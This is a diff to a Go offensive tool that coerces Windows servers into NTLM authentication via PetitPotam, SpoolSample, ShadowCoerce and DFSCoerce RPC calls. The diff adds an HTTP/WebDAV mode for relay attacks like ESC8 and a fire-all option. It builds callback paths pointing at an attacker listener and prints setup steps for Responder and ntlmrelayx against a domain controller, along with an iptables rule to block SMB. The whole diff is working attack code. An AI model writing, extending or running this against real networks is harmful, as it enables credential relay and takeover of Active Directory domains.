@@ -78,8 +78,10 @@ const (
 	//fsctlPipeTransceive = 0x0011C017
 )
 
-// Global verbose flag
+// Global flags
 var verbose bool
+var fireAll bool
+var useHTTP bool
 
 // NTLMAuth holds NTLM authentication state for DCERPC PKT_PRIVACY
 // This struct maintains the cryptographic state across multiple DCERPC requests.
@@ -154,7 +156,7 @@ func main() {
 
 	// Define flags
 	cli.Flag(&target, "t", "target", "", "Target server IP address")
-	cli.Flag(&listener, "l", "listener", "", "Listener IP for callback (Responder/ntlmrelayx)")
+	cli.Flag(&listener, "l", "listener", "", "Listener IP for callback. For HTTP: use IP@PORT/path (e.g., 10.1.1.99@80/test)")
 	cli.Flag(&username, "u", "user", "", "Domain username")
 	cli.Flag(&domain, "d", "domain", "", "Domain name")
 	cli.Flag(&password, "p", "password", "", "Password (prompted if not provided)")
@@ -164,6 +166,8 @@ func main() {
 	cli.Flag(&opnum, "opnum", -1, "Test specific opnum only. Default: try all. PetitPotam: 0, 4, 5, 6, 7, 12. SpoolSample: 62, 65")
 	cli.Flag(&proxyURL, "proxy", "", "SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)")
 	cli.Flag(&verbose, "v", "verbose", false, "Enable verbose/debug output")
+	cli.Flag(&fireAll, "a", "all", false, "Fire all opnums and path variations (default: stop after first success)")
+	cli.Flag(&useHTTP, "http", false, "Use HTTP URL for coercion instead of UNC path (for HTTP relay attacks like ESC8)")
 
 	cli.Parse()
 
@@ -179,9 +183,43 @@ func main() {
 		fmt.Printf("[!] Error: Invalid target IP address: %s\n", target)
 		os.Exit(1)
 	}
-	if !isValidIP(listener) {
-		fmt.Printf("[!] Error: Invalid listener IP address: %s\n", listener)
-		os.Exit(1)
+	// For HTTP mode, allow IP:port format; for UNC mode, require strict IP
+	if useHTTP {
+		// HTTP mode: automatically construct WebDAV path if not provided
+		if listener == "" {
+			fmt.Println("[!] Error: Listener required for HTTP mode")
+			os.Exit(1)
+		}
+
+		// Auto-construct WebDAV format: IP@80/test (unless user provided full format)
+		if !strings.Contains(listener, "@") {
+			// Just an IP - construct full WebDAV path automatically
+			listener = listener + "@80/test"
+			fmt.Printf("[+] HTTP/WebDAV mode: Auto-constructed listener path: %s\n", listener)
+		} else {
+			fmt.Printf("[+] HTTP/WebDAV mode: Using provided listener: %s\n", listener)
+		}
+
+		fmt.Printf("[+] Example path that will be sent: \\\\%s\\test\\Settings.ini\n", listener)
+		fmt.Println("[!] IMPORTANT: WebClient service must be running on target")
+		fmt.Println("[!]   - Check: sc query webclient")
+		fmt.Println("[!]   - Start: sc start webclient")
+		fmt.Println("[!]")
+		fmt.Println("[!] Listener setup (choose one):")
+		fmt.Println("[!]   - Responder: sudo responder -I eth0 -wv")
+		fmt.Println("[!]   - ntlmrelayx: sudo ntlmrelayx.py -t ldaps://dc.domain.com --http-port 80")
+		fmt.Println("[!]")
+		fmt.Println("[!] CRITICAL: Ensure SMB (port 445) is BLOCKED on your listener!")
+		fmt.Println("[!]   - Windows tries SMB first, only uses HTTP if SMB fails")
+		fmt.Println("[!]   - Run: sudo iptables -A INPUT -p tcp --dport 445 -j DROP")
+		fmt.Println("[!]")
+		fmt.Println("[!] NOTE: SpoolSample (-m spoolsample) often works better for HTTP coercion")
+		fmt.Println("[!]       PetitPotam may not reliably trigger WebClient on all Windows versions")
+	} else {
+		if !isValidIP(listener) {
+			fmt.Printf("[!] Error: Invalid listener IP address: %s\n", listener)
+			os.Exit(1)
+		}
 	}
 
 	// Validate method (case-insensitive)
@@ -403,7 +441,7 @@ func main() {
 	// Execute chosen coercion method
 	switch method {
 	case "petitpotam":
-		err = executePetitPotam(session, share, auth, listener, pipe, opnum)
+		err = executePetitPotam(session, share, auth, listener, pipe, opnum, fireAll)
 	case "spoolsample":
 		if pipe != "lsarpc" {
 			fmt.Println("[!] Note: Custom pipe parameter ignored for SpoolSample (only works on \\pipe\\spoolss)")
@@ -451,7 +489,8 @@ func main() {
 //
 // Parameters:
 //   - specificOpnum: If >= 0, only test this opnum. If -1, test all opnums
-func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, pipeName string, specificOpnum int) error {
+//   - fireAll: If true, try all opnums and path variations. If false, stop after first success.
+func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, pipeName string, specificOpnum int, fireAll bool) error {
 	fmt.Printf("[*] Using PetitPotam coercion technique via \\pipe\\%s\n", pipeName)
 
 	// Select the correct UUID based on the pipe being used
@@ -533,14 +572,11 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 
 	// Try multiple path variations like Coercer does to maximize success rate
 	// Different Windows versions respond to different path formats
-	pathVariations := []string{
-		"\\\\" + listenerIP + "\\test\\file.txt\x00", // Path with filename
-		"\\\\" + listenerIP + "\\test\\\x00",         // Path with trailing backslash
-		"\\\\" + listenerIP + "\\test\x00",           // Path without trailing backslash
-	}
+	pathVariations := buildCallbackPaths(listenerIP, useHTTP)
 
 	var lastErr error
 	successfulOpnum := -1
+opnumLoop:
 	for _, opnum := range method.Opnums {
 		funcName := opnumNames[opnum]
 		if funcName == "" {
@@ -550,8 +586,16 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 
 		// Try all path variations for this opnum
 		for pathIdx, testPath := range pathVariations {
-			if verbose {
-				fmt.Printf("[DEBUG] Path variation %d/%d: %s\n", pathIdx+1, len(pathVariations), strings.TrimRight(testPath, "\x00"))
+			pathDisplay := strings.TrimRight(testPath, "\x00")
+			if useHTTP {
+				// Always show HTTP paths being attempted (not just in verbose mode)
+				fmt.Printf("[*] Attempting HTTP path %d/%d: %s\n", pathIdx+1, len(pathVariations), pathDisplay)
+				// Verify it has forward slashes for HTTP
+				if !strings.Contains(pathDisplay, "/") && strings.Contains(pathDisplay, "@") {
+					fmt.Printf("[!] WARNING: HTTP path missing forward slash! Should be @80/path not @80\\path\n")
+				}
+			} else if verbose {
+				fmt.Printf("[DEBUG] Path variation %d/%d: %s\n", pathIdx+1, len(pathVariations), pathDisplay)
 			}
 
 			stub := createEfsRpcStub(testPath, uint16(opnum))
@@ -566,7 +610,10 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 					pathDisplay := strings.TrimRight(testPath, "\x00")
 					fmt.Printf("[+] Opnum %d (%s) path variation %d (%s) got ERROR_BAD_NETPATH - coercion successful!\n", opnum, funcName, pathIdx+1, pathDisplay)
 					successfulOpnum = int(opnum)
-					break // Success - no need to try other paths for this opnum
+					if !fireAll {
+						break opnumLoop // Early exit - we got a callback
+					}
+					break // Move to next opnum in fireAll mode
 				}
 				lastErr = err
 			} else {
@@ -576,11 +623,15 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 					if verbose {
 						fmt.Printf("[!] Opnum 0 path variation %d (%s) returned success (may be patched)\n", pathIdx+1, pathDisplay)
 					}
+					// Don't count opnum 0 "success" as actual success - keep trying
 				} else {
 					fmt.Printf("[+] Opnum %d (%s) path variation %d (%s) completed successfully\n", opnum, funcName, pathIdx+1, pathDisplay)
+					successfulOpnum = int(opnum)
+					if !fireAll {
+						break opnumLoop // Early exit - we got a callback
+					}
+					break // Move to next opnum in fireAll mode
 				}
-				successfulOpnum = int(opnum)
-				break // Success - no need to try other paths for this opnum
 			}
 		}
 	}
@@ -673,6 +724,19 @@ func executeSpoolSample(session *smb.Connection, share string, auth *NTLMAuth, l
 			stub = createRpcRemoteFindFirstPrinterChangeNotificationStub(listenerIP, printerHandle)
 		} else {
 			continue
+		}
+
+		// Show the callback path being used
+		callbackPath := buildCallbackPath(listenerIP, useHTTP, "", "")
+		pathDisplay := strings.TrimRight(callbackPath, "\x00")
+		if useHTTP {
+			fmt.Printf("[*] HTTP callback path: %s\n", pathDisplay)
+			// Verify format
+			if !strings.Contains(pathDisplay, "/") && strings.Contains(pathDisplay, "@") {
+				fmt.Printf("[!] WARNING: HTTP path missing forward slash! Has: '%s'\n", pathDisplay)
+			}
+		} else {
+			fmt.Printf("[*] SMB callback path: %s\n", pathDisplay)
 		}
 
 		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)
@@ -1427,7 +1491,102 @@ func isValidIP(ip string) bool {
 	return true
 }
 
+// buildCallbackPath builds the appropriate path for HTTP (WebDAV) or UNC mode
+// For HTTP/WebDAV: \\<listener>@<port>/path\nested\file (triggers WebClient HTTP request)
+// For UNC: \\<listener>\<sharename>\<filename>
+func buildCallbackPath(listenerIP string, httpMode bool, shareName string, fileName string) string {
+	if httpMode {
+		// WebDAV connection string format - this triggers Windows WebClient to make HTTP requests
+		// Format: \\SERVER@PORT/path\nested\file (FORWARD SLASH after @PORT, then BACKSLASHES)
+		// This matches PetitPotam.py's proven working format
+		path := "\\\\" + listenerIP
+		// If no port specified in listenerIP, default to port 80
+		if !strings.Contains(listenerIP, "@") {
+			path = "\\\\" + listenerIP + "@80"
+		}
+
+		// For HTTP mode, use the proven PetitPotam format: append \test\Settings.ini
+		// This works better than custom shareName/fileName for WebDAV
+		if shareName == "" && fileName == "" {
+			// Default to PetitPotam's proven format
+			path += "\\test\\Settings.ini"
+		} else {
+			// Custom share/file specified - use backslashes
+			if shareName != "" {
+				path += "\\" + shareName
+			}
+			if fileName != "" {
+				path += "\\" + fileName
+			}
+		}
+		return path + "\x00"
+	}
+	// UNC path format (SMB)
+	path := "\\\\" + listenerIP
+	if shareName != "" {
+		path += "\\" + shareName
+	}
+	if fileName != "" {
+		path += "\\" + fileName
+	}
+	return path + "\x00"
+}
+
+// buildCallbackPaths builds multiple path variations for PetitPotam coercion
+// Returns different formats that work across Windows versions
+func buildCallbackPaths(listenerIP string, httpMode bool) []string {
+	if httpMode {
+		// WebDAV/HTTP mode: Multiple formats for maximum compatibility
+		// CRITICAL: Use FORWARD SLASHES (/) not backslashes (\\) after @PORT!
+		// This matches PetitPotam.py: 10.1.1.99@80/test
+
+		var paths []string
+
+		// Format 1: IP@80/path variations (FORWARD SLASHES for WebDAV!)
+		webdavHost80 := listenerIP
+		if !strings.Contains(listenerIP, "@") {
+			webdavHost80 = listenerIP + "@80"
+		}
+
+		// CRITICAL: Match PetitPotam.py exactly - it uses BACKSLASH for appended paths
+		// PetitPotam.py does: '\\\\%s\\test\\Settings.ini' % listener
+		// So if listener is "10.1.1.99@80/test", it becomes: \\10.1.1.99@80/test\test\Settings.ini
+		paths = append(paths,
+			"\\\\"+webdavHost80+"\\test\\Settings.ini\x00", // Exact PetitPotam.py format!
+			"\\\\"+webdavHost80+"/test\\Settings.ini\x00",  // Mixed slashes variant
+			"\\\\"+webdavHost80+"/test/Settings.ini\x00",   // All forward slashes
+			"\\\\"+webdavHost80+"/DavWWWRoot/test.txt\x00",
+			"\\\\"+webdavHost80+"/test/file.txt\x00",
+			"\\\\"+webdavHost80+"/test\x00",
+		)
+
+		// Format 2: IP@SSL@443 for HTTPS WebDAV
+		webdavHostSSL := listenerIP
+		if !strings.Contains(listenerIP, "@") {
+			webdavHostSSL = listenerIP + "@SSL@443"
+		}
+		paths = append(paths,
+			"\\\\"+webdavHostSSL+"/DavWWWRoot/test.txt\x00",
+			"\\\\"+webdavHostSSL+"/test/file.txt\x00",
+		)
+
+		// Format 3: Simple format matching PetitPotam.py
+		paths = append(paths,
+			"\\\\"+webdavHost80+"/share\x00",
+		)
+
+		return paths
+	}
+	// UNC mode: standard path variations
+	return []string{
+		"\\\\" + listenerIP + "\\test\\file.txt\x00",
+		"\\\\" + listenerIP + "\\test\\\x00",
+		"\\\\" + listenerIP + "\\test\x00",
+	}
+}
+
 // ntHash computes the NT hash (MD4) of a password OR uses a pre-computed hash
+
 // This is the base hash used in NTLM authentication
 // Input: plaintext password OR 32-character NTLM hash (pass-the-hash)
 // Output: 16-byte MD4 hash
@@ -2137,6 +2296,14 @@ func createEfsRpcStub(uncPath string, opnum uint16) []byte {
 	utf16Path := stringToUTF16LE(uncPath)
 	lenChars := uint32(len([]rune(uncPath)))
 
+	if verbose {
+		cleanPath := strings.TrimRight(uncPath, "\x00")
+		fmt.Printf("[DEBUG] EfsRpc stub opnum=%d, path='%s' (%d chars)\n", opnum, cleanPath, lenChars)
+		if useHTTP && !strings.Contains(cleanPath, "@") {
+			fmt.Printf("[!] WARNING: HTTP mode enabled but path missing @ symbol!\n")
+		}
+	}
+
 	// Max count
 	binary.Write(&buf, binary.LittleEndian, lenChars)
 	// Offset
@@ -2234,10 +2401,10 @@ func createRpcRemoteFindFirstPrinterChangeNotificationExStub(listenerIP string, 
 	// fdwOptions (0 for default)
 	binary.Write(&buf, binary.LittleEndian, uint32(0))
 
-	// pszLocalMachine (UNC path to listener)
-	uncPath := "\\\\" + listenerIP + "\x00"
-	utf16Path := stringToUTF16LE(uncPath)
-	lenChars := uint32(len([]rune(uncPath)))
+	// pszLocalMachine (UNC path or HTTP URL to listener)
+	callbackPath := buildCallbackPath(listenerIP, useHTTP, "", "")
+	utf16Path := stringToUTF16LE(callbackPath)
+	lenChars := uint32(len([]rune(callbackPath)))
 
 	// Unique pointer (non-NULL)
 	binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID
@@ -2278,10 +2445,10 @@ func createRpcRemoteFindFirstPrinterChangeNotificationStub(listenerIP string, pr
 	// fdwOptions (0 for default)
 	binary.Write(&buf, binary.LittleEndian, uint32(0))
 
-	// pszLocalMachine (UNC path to listener)
-	uncPath := "\\\\" + listenerIP + "\x00"
-	utf16Path := stringToUTF16LE(uncPath)
-	lenChars := uint32(len([]rune(uncPath)))
+	// pszLocalMachine (UNC path or HTTP URL to listener)
+	callbackPath := buildCallbackPath(listenerIP, useHTTP, "", "")
+	utf16Path := stringToUTF16LE(callbackPath)
+	lenChars := uint32(len([]rune(callbackPath)))
 
 	// Unique pointer (non-NULL)
 	binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID
@@ -2314,14 +2481,14 @@ func createRpcRemoteFindFirstPrinterChangeNotificationStub(listenerIP string, pr
 // createShadowCoerceStub creates the stub for MS-FSRVP calls (ShadowCoerce)
 // Works for IsPathSupported (opnum 8) and IsPathShadowed (opnum 9)
 func createShadowCoerceStub(listenerIP string, opnum uint16) []byte {
-	// Build UNC path with null terminator
-	uncPath := "\\\\" + listenerIP + "\\share\x00"
+	// Build callback path with null terminator
+	callbackPath := buildCallbackPath(listenerIP, useHTTP, "share", "")
 
 	var buf bytes.Buffer
 
 	// Convert to UTF-16LE
-	utf16Path := stringToUTF16LE(uncPath)
-	lenChars := uint32(len([]rune(uncPath)))
+	utf16Path := stringToUTF16LE(callbackPath)
+	lenChars := uint32(len([]rune(callbackPath)))
 
 	// ShareName parameter (conformant varying string)
 	// Max count
@@ -2348,7 +2515,7 @@ func createShadowCoerceStub(listenerIP string, opnum uint16) []byte {
 // Works for NetrDfsAddStdRoot (opnum 12) and NetrDfsRemoveStdRoot (opnum 13)
 func createDFSCoerceStub(listenerIP string, opnum uint16) []byte {
 	// Build server name and share name
-	serverName := "\\\\" + listenerIP + "\x00"
+	serverName := buildCallbackPath(listenerIP, useHTTP, "", "")
 	shareName := "share\x00"
 	comment := "comment\x00"
 
